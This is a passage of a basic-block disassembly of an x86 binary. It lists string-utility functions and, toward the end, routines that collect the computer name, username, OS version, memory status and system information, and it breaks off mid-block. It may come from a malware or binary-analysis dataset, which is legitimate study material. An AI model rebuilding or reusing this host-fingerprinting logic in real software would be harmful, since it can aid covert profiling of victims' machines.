0x8051ff5:	push	eax
0x8051ff6:	mov	eax, dword ptr [esp + 0x14]
0x8051ffa:	inc	eax
0x8051ffb:	push	eax
0x8051ffc:	push	edx
0x8051ffd:	call	0x804bd30
None
|
|
|
v
0x8051fb0:	cmp	byte ptr [esp + 0xa], 0
0x8051fb5:	je	0x8051fc6
None
|
|
|
v
0x8051f5f:	xor	eax, eax
0x8051f61:	or	ecx, 0xffffffff
0x8051f64:	mov	edi, edx
0x8051f66:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8051f68:	not	ecx
0x8051f6a:	lea	esi, dword ptr [ecx - 1]
0x8051f6d:	mov	edi, dword ptr [ebp]
0x8051f70:	test	edi, edi
0x8051f72:	setne	byte ptr [esp + 0xb]
0x8051f77:	cmp	dword ptr [esp + 0x3c], -1
0x8051f7c:	jne	0x8051f93
None
|
|
|
v
0x8052019:	mov	eax, dword ptr [esp + 0xc]
0x805201d:	cmp	byte ptr [esp + 9], 0
0x8052022:	mov	byte ptr [ebx + eax], 0
0x8052026:	je	0x805203e
None
|
|
|
v
0x8051f8c:	not	ecx
0x8051f8e:	dec	ecx
0x8051f8f:	mov	dword ptr [esp + 0x3c], ecx
0x8051f93:	mov	eax, dword ptr [esp + 0x3c]
0x8051f97:	xor	ebx, ebx
0x8051f99:	add	eax, esi
0x8051f9b:	mov	dword ptr [esp + 0xc], eax
0x8051f9f:	js	0x805203e
None
|
|
|
v
0x8052031:	mov	eax, dword ptr [esp + 0x40]
0x8052035:	add	esp, 0x10
0x8052038:	mov	dword ptr [eax], 0
0x805203e:	add	esp, 0x1c
0x8052041:	mov	eax, ebx
0x8052043:	pop	ebx
0x8052044:	pop	esi
0x8052045:	pop	edi
0x8052046:	pop	ebp
0x8052047:	ret	
None
|
|
|
v
0x8051fe0:	sub	esp, 0xc
0x8051fe3:	push	ebp
0x8051fe4:	call	0x804f57c
None
|
|
|
v
0x8051fc3:	add	esp, 0x10
0x8051fc6:	mov	ebx, dword ptr [ebp]
0x8051fc9:	jmp	0x805203e
None
|
|
|
v
0x8051f7e:	cmp	byte ptr [esp + 0xb], 0
0x8051f83:	je	0x8051f93
None
|
|
|
v
0x8051fa9:	cmp	byte ptr [esp + 9], 0
0x8051fae:	je	0x8051fc6
None
|
|
|
v
0x8051fa5:	test	esi, esi
0x8051fa7:	jg	0x8051fcb
None
|
|
|
v
0x8052028:	sub	esp, 0xc
0x805202b:	push	ebp
0x805202c:	call	0x804f57c
None
|
|
|
v
0x8051f58:	cmp	byte ptr [esp + 0xa], 0
0x8051f5d:	je	0x8051f6d
None
|
|
|
v
0x8051f85:	xor	eax, eax
0x8051f87:	or	ecx, 0xffffffff
0x8051f8a:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8051f6d:	mov	edi, dword ptr [ebp]
0x8051f70:	test	edi, edi
0x8051f72:	setne	byte ptr [esp + 0xb]
0x8051f77:	cmp	dword ptr [esp + 0x3c], -1
0x8051f7c:	jne	0x8051f93
None
|
|
|
v
0x805203e:	add	esp, 0x1c
0x8052041:	mov	eax, ebx
0x8052043:	pop	ebx
0x8052044:	pop	esi
0x8052045:	pop	edi
0x8052046:	pop	ebp
0x8052047:	ret	
None
|
|
|
v
0x8051f8a:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrNCompare
TOTAL BLOCKS :6
0x8052069:	pop	ebx
0x805206a:	pop	esi
0x805206b:	ret	
None
|
|
|
v
0x805205a:	mov	dl, byte ptr [ecx + eax]
0x805205d:	cmp	byte ptr [ebx + eax], dl
0x8052060:	jne	0x8052069
None
|
|
|
v
0x8052067:	xor	eax, eax
0x8052069:	pop	ebx
0x805206a:	pop	esi
0x805206b:	ret	
None
|
|
|
v
0x8052048:	push	esi
0x8052049:	xor	eax, eax
0x805204b:	push	ebx
0x805204c:	mov	ebx, dword ptr [esp + 0xc]
0x8052050:	mov	ecx, dword ptr [esp + 0x10]
0x8052054:	mov	esi, dword ptr [esp + 0x14]
0x8052058:	jmp	0x8052063
None
|
|
|
v
0x8052062:	inc	eax
0x8052063:	cmp	eax, esi
0x8052065:	jl	0x805205a
None
|
|
|
v
0x8052063:	cmp	eax, esi
0x8052065:	jl	0x805205a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsInteger
TOTAL BLOCKS :7
0x8052089:	mov	al, 1
0x805208b:	ret	
None
|
|
|
v
0x805207a:	sub	edx, 0x30
0x805207d:	inc	eax
0x805207e:	cmp	dl, 9
0x8052081:	ja	0x805208c
None
|
|
|
v
0x8052076:	mov	eax, edx
0x8052078:	jmp	0x8052083
None
|
|
|
v
0x805208e:	ret	
None
|
|
|
v
0x8052083:	mov	dl, byte ptr [eax]
0x8052085:	test	dl, dl
0x8052087:	jne	0x805207a
None
|
|
|
v
0x805206c:	mov	edx, dword ptr [esp + 4]
0x8052070:	xor	eax, eax
0x8052072:	test	edx, edx
0x8052074:	je	0x805208e
None
|
|
|
v
0x805208c:	xor	eax, eax
0x805208e:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsSpace
TOTAL BLOCKS :1
0x805208f:	cmp	byte ptr [esp + 4], 0x20
0x8052094:	sete	al
0x8052097:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CharToUpper
TOTAL BLOCKS :3
0x80520a4:	sub	eax, 0x20
0x80520a7:	ret	
None
|
|
|
v
0x80520a7:	ret	
None
|
|
|
v
0x8052098:	mov	al, byte ptr [esp + 4]
0x805209c:	lea	edx, dword ptr [eax - 0x61]
0x805209f:	cmp	dl, 0x19
0x80520a2:	ja	0x80520a7
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:WildcardCompare
TOTAL BLOCKS :27
0x8052122:	mov	al, byte ptr [ebp]
0x8052125:	test	al, al
0x8052127:	jne	0x80520cf
None
|
|
|
v
0x8052144:	xor	eax, eax
0x8052146:	add	esp, 0xc
0x8052149:	pop	ebx
0x805214a:	pop	esi
0x805214b:	pop	edi
0x805214c:	pop	ebp
0x805214d:	ret	
None
|
|
|
v
0x805212b:	inc	ebx
0x805212c:	mov	al, byte ptr [ebx]
0x805212e:	cmp	al, 0x2a
0x8052130:	je	0x805212b
None
|
|
|
v
0x8052129:	jmp	0x805212c
None
|
|
|
v
0x8052132:	test	al, al
0x8052134:	sete	al
0x8052137:	jmp	0x8052146
None
|
|
|
v
0x80520db:	cmp	al, 0x2e
0x80520dd:	jne	0x8052120
None
|
|
|
v
0x80520d6:	cmp	cl, 0x3f
0x80520d9:	jne	0x80520f2
None
|
|
|
v
0x8052120:	inc	ebp
0x8052121:	inc	ebx
0x8052122:	mov	al, byte ptr [ebp]
0x8052125:	test	al, al
0x8052127:	jne	0x80520cf
None
|
|
|
v
0x80520c9:	mov	ebx, esi
0x80520cb:	mov	ebp, edi
0x80520cd:	jmp	0x8052122
None
|
|
|
v
0x80520bf:	xor	edx, edx
0x80520c1:	test	esi, esi
0x80520c3:	jne	0x80520c9
None
|
|
|
v
0x80520ea:	test	al, al
0x80520ec:	je	0x8052140
None
|
|
|
v
0x80520a8:	push	ebp
0x80520a9:	push	edi
0x80520aa:	push	esi
0x80520ab:	push	ebx
0x80520ac:	sub	esp, 0xc
0x80520af:	mov	edi, dword ptr [esp + 0x24]
0x80520b3:	mov	esi, dword ptr [esp + 0x20]
0x80520b7:	test	edi, edi
0x80520b9:	je	0x8052144
None
|
|
|
v
0x80520f2:	movsx	eax, al
0x80520f5:	push	eax
0x80520f6:	mov	byte ptr [esp + 4], dl
0x80520fa:	mov	byte ptr [esp + 8], cl
0x80520fe:	call	0x8052098
None
|
|
|
v
0x80520c7:	mov	dl, 1
0x80520c9:	mov	ebx, esi
0x80520cb:	mov	ebp, edi
0x80520cd:	jmp	0x8052122
None
|
|
|
v
0x80520e1:	mov	esi, ebx
0x80520e3:	inc	esi
0x80520e4:	mov	al, byte ptr [esi]
0x80520e6:	cmp	al, 0x2a
0x80520e8:	je	0x80520e3
None
|
|
|
v
0x80520df:	jmp	0x8052139
None
|
|
|
v
0x8052116:	pop	edx
0x8052117:	mov	dl, byte ptr [esp]
0x805211a:	cmp	byte ptr [esp + 0xb], al
0x805211e:	jne	0x8052139
None
|
|
|
v
0x80520c5:	jmp	0x8052144
None
|
|
|
v
0x8052139:	test	dl, dl
0x805213b:	je	0x8052144
None
|
|
|
v
0x805212c:	mov	al, byte ptr [ebx]
0x805212e:	cmp	al, 0x2a
0x8052130:	je	0x805212b
None
|
|
|
v
0x8052103:	mov	cl, byte ptr [esp + 8]
0x8052107:	movsx	ecx, cl
0x805210a:	mov	dword ptr [esp], ecx
0x805210d:	mov	byte ptr [esp + 0xf], al
0x8052111:	call	0x8052098
None
|
|
|
v
0x805213d:	inc	edi
0x805213e:	jmp	0x80520c7
None
|
|
|
v
0x8052146:	add	esp, 0xc
0x8052149:	pop	ebx
0x805214a:	pop	esi
0x805214b:	pop	edi
0x805214c:	pop	ebp
0x805214d:	ret	
None
|
|
|
v
0x80520ee:	mov	edi, ebp
0x80520f0:	jmp	0x80520c7
None
|
|
|
v
0x8052140:	mov	al, 1
0x8052142:	jmp	0x8052146
None
|
|
|
v
0x80520e3:	inc	esi
0x80520e4:	mov	al, byte ptr [esi]
0x80520e6:	cmp	al, 0x2a
0x80520e8:	je	0x80520e3
None
|
|
|
v
0x80520cf:	mov	cl, byte ptr [ebx]
0x80520d1:	cmp	cl, 0x2a
0x80520d4:	je	0x80520e1
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CharToLower
TOTAL BLOCKS :3
0x805214e:	mov	al, byte ptr [esp + 4]
0x8052152:	lea	edx, dword ptr [eax - 0x41]
0x8052155:	cmp	dl, 0x19
0x8052158:	ja	0x805215d
None
|
|
|
v
0x805215a:	add	eax, 0x20
0x805215d:	ret	
None
|
|
|
v
0x805215d:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CharCount
TOTAL BLOCKS :5
0x805216d:	jmp	0x8052180
None
|
|
|
v
0x805217a:	mov	cl, byte ptr [edx]
0x805217c:	test	cl, cl
0x805217e:	jne	0x805216f
None
|
|
|
v
0x805215e:	push	ebx
0x805215f:	mov	edx, dword ptr [esp + 0xc]
0x8052163:	xor	eax, eax
0x8052165:	mov	bl, byte ptr [esp + 8]
0x8052169:	test	edx, edx
0x805216b:	jne	0x805217a
None
|
|
|
v
0x8052180:	pop	ebx
0x8052181:	ret	
None
|
|
|
v
0x805216f:	cmp	cl, bl
0x8052171:	sete	cl
0x8052174:	inc	edx
0x8052175:	movzx	ecx, cl
0x8052178:	add	eax, ecx
0x805217a:	mov	cl, byte ptr [edx]
0x805217c:	test	cl, cl
0x805217e:	jne	0x805216f
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CharPosition
TOTAL BLOCKS :6
0x8052196:	je	0x80521a2
None
|
|
|
v
0x8052198:	mov	cl, byte ptr [edx + eax]
0x805219b:	test	cl, cl
0x805219d:	jne	0x8052191
None
|
|
|
v
0x8052191:	cmp	cl, bl
0x8052193:	lea	eax, dword ptr [eax + 1]
0x8052196:	je	0x80521a2
None
|
|
|
v
0x805219f:	or	eax, 0xffffffff
0x80521a2:	pop	ebx
0x80521a3:	ret	
None
|
|
|
v
0x80521a2:	pop	ebx
0x80521a3:	ret	
None
|
|
|
v
0x8052182:	push	ebx
0x8052183:	mov	edx, dword ptr [esp + 0xc]
0x8052187:	xor	eax, eax
0x8052189:	mov	bl, byte ptr [esp + 8]
0x805218d:	test	edx, edx
0x805218f:	jmp	0x8052196
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrSplit
TOTAL BLOCKS :16
0x805221c:	cmp	edi, eax
0x805221e:	jl	0x805220e
None
|
|
|
v
0x8052206:	xor	ecx, ecx
0x8052208:	lea	eax, dword ptr [edi + eax - 1]
0x805220c:	jmp	0x8052216
None
|
|
|
v
0x8052226:	or	ecx, 0xffffffff
0x8052229:	add	esp, 8
0x805222c:	mov	eax, ecx
0x805222e:	pop	ebx
0x805222f:	pop	esi
0x8052230:	pop	edi
0x8052231:	pop	ebp
0x8052232:	ret	
None
|
|
|
v
0x8052200:	cmp	ebp, dword ptr [esp + 4]
0x8052204:	jl	0x80521e9
None
|
|
|
v
0x80521c9:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x805220e:	mov	dl, byte ptr [ebx + edi]
0x8052211:	inc	edi
0x8052212:	mov	byte ptr [esi + ecx], dl
0x8052215:	inc	ecx
0x8052216:	cmp	ecx, dword ptr [esp + 0x2c]
0x805221a:	jae	0x8052220
None
|
|
|
v
0x80521d8:	pop	edi
0x80521d9:	xor	edi, edi
0x80521db:	pop	ebp
0x80521dc:	xor	ebp, ebp
0x80521de:	mov	edx, dword ptr [esp + 0x24]
0x80521e2:	dec	edx
0x80521e3:	mov	dword ptr [esp + 4], edx
0x80521e7:	jmp	0x8052200
None
|
|
|
v
0x80521fe:	pop	edx
0x80521ff:	pop	ecx
0x8052200:	cmp	ebp, dword ptr [esp + 4]
0x8052204:	jl	0x80521e9
None
|
|
|
v
0x8052229:	add	esp, 8
0x805222c:	mov	eax, ecx
0x805222e:	pop	ebx
0x805222f:	pop	esi
0x8052230:	pop	edi
0x8052231:	pop	ebp
0x8052232:	ret	
None
|
|
|
v
0x80521a4:	push	ebp
0x80521a5:	or	ecx, 0xffffffff
0x80521a8:	push	edi
0x80521a9:	push	esi
0x80521aa:	push	ebx
0x80521ab:	sub	esp, 8
0x80521ae:	mov	ebx, dword ptr [esp + 0x1c]
0x80521b2:	mov	esi, dword ptr [esp + 0x28]
0x80521b6:	mov	dl, byte ptr [esp + 0x20]
0x80521ba:	test	ebx, ebx
0x80521bc:	je	0x8052229
None
|
|
|
v
0x8052220:	mov	byte ptr [esi + ecx], 0
0x8052224:	jmp	0x8052229
None
|
|
|
v
0x80521ee:	add	edi, eax
0x80521f0:	inc	ebp
0x80521f1:	lea	eax, dword ptr [ebx + edi]
0x80521f4:	push	eax
0x80521f5:	push	dword ptr [esp + 4]
0x80521f9:	call	0x8052182
None
|
|
|
v
0x8052216:	cmp	ecx, dword ptr [esp + 0x2c]
0x805221a:	jae	0x8052220
None
|
|
|
v
0x80521e9:	cmp	eax, 0xff
0x80521ec:	je	0x8052226
None
|
|
|
v
0x80521be:	mov	ecx, dword ptr [esp + 0x2c]
0x80521c2:	xor	eax, eax
0x80521c4:	mov	edi, esi
0x80521c6:	movsx	edx, dl
0x80521c9:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x80521cb:	mov	dword ptr [esp], edx
0x80521ce:	push	ebx
0x80521cf:	push	dword ptr [esp + 4]
0x80521d3:	call	0x8052182
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:MemCompare
TOTAL BLOCKS :6
0x8052257:	cmp	eax, esi
0x8052259:	jne	0x8052246
None
|
|
|
v
0x8052233:	push	esi
0x8052234:	xor	eax, eax
0x8052236:	push	ebx
0x8052237:	push	ecx
0x8052238:	mov	ebx, dword ptr [esp + 0x10]
0x805223c:	mov	ecx, dword ptr [esp + 0x14]
0x8052240:	mov	esi, dword ptr [esp + 0x18]
0x8052244:	jmp	0x8052257
None
|
|
|
v
0x8052246:	mov	dl, byte ptr [ebx + eax]
0x8052249:	inc	eax
0x805224a:	cmp	dl, byte ptr [ecx + eax - 1]
0x805224e:	je	0x8052257
None
|
|
|
v
0x805225b:	xor	eax, eax
0x805225d:	pop	edx
0x805225e:	pop	ebx
0x805225f:	pop	esi
0x8052260:	ret	
None
|
|
|
v
0x805225d:	pop	edx
0x805225e:	pop	ebx
0x805225f:	pop	esi
0x8052260:	ret	
None
|
|
|
v
0x8052250:	sbb	eax, eax
0x8052252:	or	eax, 1
0x8052255:	jmp	0x805225d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strlenW
TOTAL BLOCKS :5
0x8052261:	mov	edx, dword ptr [esp + 4]
0x8052265:	xor	eax, eax
0x8052267:	test	edx, edx
0x8052269:	jne	0x805226f
None
|
|
|
v
0x8052275:	ret	
None
|
|
|
v
0x805226f:	cmp	byte ptr [edx + eax*4], 0
0x8052273:	jne	0x805226c
None
|
|
|
v
0x805226b:	ret	
None
|
|
|
v
0x805226c:	add	eax, 2
0x805226f:	cmp	byte ptr [edx + eax*4], 0
0x8052273:	jne	0x805226c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ExtractFilePath
TOTAL BLOCKS :12
0x8052276:	push	edi
0x8052277:	xor	eax, eax
0x8052279:	push	esi
0x805227a:	push	ebx
0x805227b:	mov	ebx, dword ptr [esp + 0x10]
0x805227f:	mov	edx, dword ptr [esp + 0x14]
0x8052283:	mov	esi, dword ptr [esp + 0x18]
0x8052287:	test	ebx, ebx
0x8052289:	mov	edi, edx
0x805228b:	mov	ecx, esi
0x805228d:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x80522b3:	mov	byte ptr [edx + edi + 1], 0
0x80522b8:	pop	ebx
0x80522b9:	pop	esi
0x80522ba:	pop	edi
0x80522bb:	ret	
None
|
|
|
v
0x805228d:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x805228f:	je	0x80522b8
None
|
|
|
v
0x8052291:	or	edi, 0xffffffff
0x8052294:	xor	eax, eax
0x8052296:	jmp	0x80522a8
None
|
|
|
v
0x8052298:	cmp	cl, 0x2f
0x805229b:	je	0x80522a2
None
|
|
|
v
0x80522b8:	pop	ebx
0x80522b9:	pop	esi
0x80522ba:	pop	edi
0x80522bb:	ret	
None
|
|
|
v
0x80522a2:	mov	edi, eax
0x80522a4:	mov	byte ptr [edx + eax], cl
0x80522a7:	inc	eax
0x80522a8:	mov	cl, byte ptr [ebx + eax]
0x80522ab:	test	cl, cl
0x80522ad:	je	0x80522b3
None
|
|
|
v
0x80522a8:	mov	cl, byte ptr [ebx + eax]
0x80522ab:	test	cl, cl
0x80522ad:	je	0x80522b3
None
|
|
|
v
0x80522af:	cmp	esi, eax
0x80522b1:	ja	0x8052298
None
|
|
|
v
0x805229d:	cmp	cl, 0x5c
0x80522a0:	jne	0x80522a4
None
|
|
|
v
0x80522a4:	mov	byte ptr [edx + eax], cl
0x80522a7:	inc	eax
0x80522a8:	mov	cl, byte ptr [ebx + eax]
0x80522ab:	test	cl, cl
0x80522ad:	je	0x80522b3
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ExtractFileName
TOTAL BLOCKS :12
0x80522eb:	mov	cl, byte ptr [edx + eax]
0x80522ee:	test	cl, cl
0x80522f0:	je	0x80522f6
None
|
|
|
v
0x80522f6:	lea	eax, dword ptr [edx + edi + 1]
0x80522fa:	mov	dword ptr [esp + 0x18], ebx
0x80522fe:	mov	dword ptr [esp + 0x14], eax
0x8052302:	mov	dword ptr [esp + 0x10], esi
0x8052306:	pop	ebx
0x8052307:	pop	esi
0x8052308:	pop	edi
0x8052309:	jmp	0x8051ce0
None
|
|
|
v
0x80522ea:	inc	eax
0x80522eb:	mov	cl, byte ptr [edx + eax]
0x80522ee:	test	cl, cl
0x80522f0:	je	0x80522f6
None
|
|
|
v
0x805230e:	pop	ebx
0x805230f:	pop	esi
0x8052310:	pop	edi
0x8052311:	ret	
None
|
|
|
v
0x80522d5:	je	0x805230e
None
|
|
|
v
0x80522f2:	cmp	ebx, eax
0x80522f4:	ja	0x80522de
None
|
|
|
v
0x80522e8:	mov	edi, eax
0x80522ea:	inc	eax
0x80522eb:	mov	cl, byte ptr [edx + eax]
0x80522ee:	test	cl, cl
0x80522f0:	je	0x80522f6
None
|
|
|
v
0x80522d3:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x80522de:	cmp	cl, 0x2f
0x80522e1:	je	0x80522e8
None
|
|
|
v
0x80522bc:	push	edi
0x80522bd:	xor	eax, eax
0x80522bf:	push	esi
0x80522c0:	push	ebx
0x80522c1:	mov	edx, dword ptr [esp + 0x10]
0x80522c5:	mov	esi, dword ptr [esp + 0x14]
0x80522c9:	mov	ebx, dword ptr [esp + 0x18]
0x80522cd:	test	edx, edx
0x80522cf:	mov	edi, esi
0x80522d1:	mov	ecx, ebx
0x80522d3:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x80522d7:	or	edi, 0xffffffff
0x80522da:	xor	eax, eax
0x80522dc:	jmp	0x80522eb
None
|
|
|
v
0x80522e3:	cmp	cl, 0x5c
0x80522e6:	jne	0x80522ea
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetComputerName
TOTAL BLOCKS :7
0x8052346:	add	esp, 0x10
0x8052349:	pop	ebx
0x805234a:	pop	esi
0x805234b:	pop	edi
0x805234c:	ret	
None
|
|
|
v
0x8052314:	push	edi
0x8052315:	xor	eax, eax
0x8052317:	push	esi
0x8052318:	push	ebx
0x8052319:	mov	esi, dword ptr [esp + 0x14]
0x805231d:	mov	ebx, dword ptr [esp + 0x10]
0x8052321:	mov	ecx, esi
0x8052323:	mov	edi, ebx
0x8052325:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x8052333:	add	esp, 0x10
0x8052336:	inc	eax
0x8052337:	jne	0x8052349
None
|
|
|
v
0x8052327:	lea	eax, dword ptr [esi - 1]
0x805232a:	push	edx
0x805232b:	push	edx
0x805232c:	push	eax
0x805232d:	push	ebx
0x805232e:	call	0x804bd00
None
|
|
|
v
0x8052339:	push	eax
0x805233a:	push	esi
0x805233b:	push	0x80564b4
0x8052340:	push	ebx
0x8052341:	call	0x8051ce0
None
|
|
|
v
0x8052349:	pop	ebx
0x805234a:	pop	esi
0x805234b:	pop	edi
0x805234c:	ret	
None
|
|
|
v
0x8052325:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetUsername
TOTAL BLOCKS :2
0x805234d:	sub	esp, 0x18
0x8052350:	push	0x80564be
0x8052355:	call	0x804bd10
None
|
|
|
v
0x805235a:	add	esp, 0x1c
0x805235d:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ReadFile
TOTAL BLOCKS :8
0x805238b:	add	esp, 0x10
0x805238e:	test	eax, eax
0x8052390:	mov	esi, eax
0x8052392:	je	0x80523b8
None
|
|
|
v
0x805235e:	push	ebp
0x805235f:	push	edi
0x8052360:	xor	edi, edi
0x8052362:	push	esi
0x8052363:	push	ebx
0x8052364:	sub	esp, 0x10
0x8052367:	mov	ebp, dword ptr [esp + 0x2c]
0x805236b:	mov	ebx, dword ptr [esp + 0x28]
0x805236f:	push	ebp
0x8052370:	push	0x80564c3
0x8052375:	push	ebx
0x8052376:	call	0x8051ce0
None
|
|
|
v
0x805237b:	pop	ecx
0x805237c:	pop	esi
0x805237d:	push	0x80562ec
0x8052382:	push	dword ptr [esp + 0x2c]
0x8052386:	call	0x804bca0
None
|
|
|
v
0x8052394:	push	eax
0x8052395:	push	ebp
0x8052396:	push	1
0x8052398:	push	ebx
0x8052399:	call	0x804bce0
None
|
|
|
v
0x805239e:	mov	dword ptr [esp], esi
0x80523a1:	mov	ebp, eax
0x80523a3:	call	0x804bbe0
None
|
|
|
v
0x80523a8:	add	esp, 0x10
0x80523ab:	test	ebp, ebp
0x80523ad:	jle	0x80523b8
None
|
|
|
v
0x80523af:	mov	byte ptr [ebx + ebp], 0
0x80523b3:	mov	edi, 1
0x80523b8:	add	esp, 0xc
0x80523bb:	mov	eax, edi
0x80523bd:	pop	ebx
0x80523be:	pop	esi
0x80523bf:	pop	edi
0x80523c0:	pop	ebp
0x80523c1:	ret	
None
|
|
|
v
0x80523b8:	add	esp, 0xc
0x80523bb:	mov	eax, edi
0x80523bd:	pop	ebx
0x80523be:	pop	esi
0x80523bf:	pop	edi
0x80523c0:	pop	ebp
0x80523c1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpGetOSVersion
TOTAL BLOCKS :16
0x805242b:	add	esp, 0x10
0x805242e:	test	eax, eax
0x8052430:	js	0x8052446
None
|
|
|
v
0x8052403:	jmp	0x8052462
None
|
|
|
v
0x80523e6:	add	esp, 0x10
0x80523e9:	test	al, al
0x80523eb:	jne	0x8052462
None
|
|
|
v
0x80523ed:	sub	esp, 0xc
0x80523f0:	push	0x80564dc
0x80523f5:	call	0x804bfd0
None
|
|
|
v
0x8052405:	lea	ebp, dword ptr [eax + 0x13]
0x8052408:	push	eax
0x8052409:	push	0x80564e2
0x805240e:	push	ebp
0x805240f:	push	0
0x8052411:	call	0x8051d7f
None
|
|
|
v
0x805245f:	add	esp, 0x10
0x8052462:	add	esp, 0x110c
0x8052468:	pop	ebx
0x8052469:	pop	esi
0x805246a:	pop	edi
0x805246b:	pop	ebp
0x805246c:	ret	
None
|
|
|
v
0x8052462:	add	esp, 0x110c
0x8052468:	pop	ebx
0x8052469:	pop	esi
0x805246a:	pop	edi
0x805246b:	pop	ebp
0x805246c:	ret	
None
|
|
|
v
0x8052446:	sub	esp, 0xc
0x8052449:	push	ebx
0x805244a:	call	0x804bef0
None
|
|
|
v
0x80523fa:	add	esp, 0x10
0x80523fd:	test	eax, eax
0x80523ff:	mov	ebx, eax
0x8052401:	jne	0x8052446
None
|
|
|
v
0x8052456:	sub	esp, 0xc
0x8052459:	push	ebx
0x805245a:	call	0x804bfc0
None
|
|
|
v
0x8052416:	add	esp, 0x10
0x8052419:	test	eax, eax
0x805241b:	jns	0x8052432
None
|
|
|
v
0x805244f:	add	esp, 0x10
0x8052452:	test	eax, eax
0x8052454:	jne	0x8052405
None
|
|
|
v
0x8052432:	push	ebp
0x8052433:	push	edi
0x8052434:	push	esi
0x8052435:	lea	eax, dword ptr [esp + 0xc]
0x8052439:	push	eax
0x805243a:	call	0x805235e
None
|
|
|
v
0x805241d:	push	eax
0x805241e:	push	0x80564d4
0x8052423:	push	ebp
0x8052424:	push	0
0x8052426:	call	0x8051d7f
None
|
|
|
v
0x80523c2:	push	ebp
0x80523c3:	push	edi
0x80523c4:	push	esi
0x80523c5:	push	ebx
0x80523c6:	sub	esp, 0x1110
0x80523cc:	mov	edi, dword ptr [esp + 0x1128]
0x80523d3:	mov	esi, dword ptr [esp + 0x1124]
0x80523da:	push	edi
0x80523db:	push	esi
0x80523dc:	push	0x80564cb
0x80523e1:	call	0x805235e
None
|
|
|
v
0x805243f:	add	esp, 0x10
0x8052442:	test	al, al
0x8052444:	jne	0x8052456
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpMemoryStatus
TOTAL BLOCKS :4
0x80524d4:	add	esp, 0x48
0x80524d7:	pop	ebx
0x80524d8:	ret	
None
|
|
|
v
0x80524af:	mov	eax, dword ptr [esp]
0x80524b2:	mov	dword ptr [ebx + 0xc], 0
0x80524b9:	mov	dword ptr [ebx + 0x14], 0
0x80524c0:	cdq	
0x80524c1:	mov	dword ptr [ebx], eax
0x80524c3:	mov	eax, dword ptr [esp + 0x10]
0x80524c7:	mov	dword ptr [ebx + 4], edx
0x80524ca:	mov	edx, dword ptr [esp + 0x14]
0x80524ce:	mov	dword ptr [ebx + 8], eax
0x80524d1:	mov	dword ptr [ebx + 0x10], edx
0x80524d4:	add	esp, 0x48
0x80524d7:	pop	ebx
0x80524d8:	ret	
None
|
|
|
v
0x80524a8:	add	esp, 0x10
0x80524ab:	test	eax, eax
0x80524ad:	jne	0x80524d4
None
|
|
|
v
0x805246d:	push	ebx
0x805246e:	sub	esp, 0x54
0x8052471:	mov	ebx, dword ptr [esp + 0x5c]
0x8052475:	lea	eax, dword ptr [esp + 0xc]
0x8052479:	mov	dword ptr [ebx + 8], 0
0x8052480:	mov	dword ptr [ebx + 0xc], 0
0x8052487:	mov	dword ptr [ebx + 0x10], 0
0x805248e:	mov	dword ptr [ebx + 0x14], 0
0x8052495:	mov	dword ptr [ebx], 0
0x805249b:	mov	dword ptr [ebx + 4], 0
0x80524a2:	push	eax
0x80524a3:	call	0x804bd50
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpSystemInformation
TOTAL BLOCKS :20
0x8052673:	mov	dword ptr [esp], ebx
0x8052676:	call	0x804f57c
None
|
|
|
v
0x80524f5:	pop	eax
0x80524f6:	pop	edx
0x80524f7:	push	0x800
0x80524fc:	lea	eax, dword ptr [esp + 0x1930]
0x8052503:	push	eax
0x8052504:	call	0x8052314
None
|
|
|
v
0x8052509:	pop	ecx
0x805250a:	lea	eax, dword ptr [esp + 0x2130]
0x8052511:	push	eax
0x8052512:	call	0x805246d
None
|
|
|
v
0x80525d7:	add	esp, 0xc
0x80525da:	push	ebx
0x80525db:	push	0x8058374
0x80525e0:	mov	edx, eax
0x80525e2:	movzx	eax, byte ptr [esp + 0x13]
0x80525e7:	push	eax
0x80525e8:	lea	eax, dword ptr [esp + 0x34]
0x80525ec:	push	eax
0x80525ed:	push	esi
0x80525ee:	push	0x80584ec
0x80525f3:	push	edi
0x80525f4:	push	0x8058510
0x80525f9:	push	0x8058610
0x80525fe:	push	ebp
0x80525ff:	mov	ecx, dword ptr [esp + 0x2c]
0x8052603:	push	ecx
0x8052604:	push	dword ptr [esp + 0x3c]
0x8052608:	push	dword ptr [esp + 0x3c]
0x805260c:	push	dword ptr [esp + 0x4c]
0x8052610:	push	dword ptr [esp + 0x4c]
